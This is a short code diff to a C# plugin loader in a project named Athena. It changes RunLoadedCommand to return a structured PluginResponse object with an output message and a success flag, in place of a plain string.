@@ -1,4 +1,5 @@
 ﻿using Athena.Commands.Model;
+using Athena.Models.Athena.Commands;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -66,18 +67,22 @@ namespace Athena.Commands
                 return "Failed to load Command!" + Environment.NewLine + e.Message;
             }
         }
-        public static string RunLoadedCommand(string name, Dictionary<string, object> args)
+        public static PluginResponse RunLoadedCommand(string name, Dictionary<string, object> args)
         {
             try
             {
                 Type t = Globals.loadedcommands[name].GetType("Athena.Plugin");
                 var methodInfo = t.GetMethod("Execute", new Type[] { typeof(Dictionary<string,object>) });
                 var result = methodInfo.Invoke(null, new object[] { args });
-                return result.ToString();
+                return (PluginResponse)result;
             }
             catch (Exception e)
             {
-                return "[ERROR]" + e.Message;
+                return new PluginResponse()
+                {
+                    output = e.Message,
+                    success = false
+                };
             }
         }
     }
